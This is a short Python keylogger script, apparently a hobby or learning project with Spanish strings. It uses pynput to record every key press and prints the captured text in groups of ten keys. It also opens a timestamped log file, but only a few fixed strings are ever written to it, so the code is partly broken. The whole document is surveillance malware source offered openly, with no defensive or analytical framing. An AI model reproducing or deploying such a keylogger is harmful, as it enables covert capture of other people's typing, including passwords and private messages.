import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

f = open('keylogger_{}.txt'.format(d), 'w')

texto = []


def key_count(key):
    if len(texto) >= 10:
        textof = ' '.join(texto)
        print(textof)
        texto.clear()


def key_recorder(key):

    key = str(key)
    if key == 'Key.enter':
        texto.append('\n')
    elif key == 'Key.space':
        texto.append(' ')
    elif key == 'Key.backspace':
        texto.append('%BORRAR%')
    elif key == 'Key.ctrl_l':
        f.write('')
    elif key == 'Key.shift':
        f.write('')
    elif key == "'\x03'":
        f.write('\n\nSaliendo del keylogger...')
        f.close()
        quit()
    else:
        texto.append(key.replace("'",""))




with Listener(on_press=key_recorder, on_release=key_count) as l:
    l.join()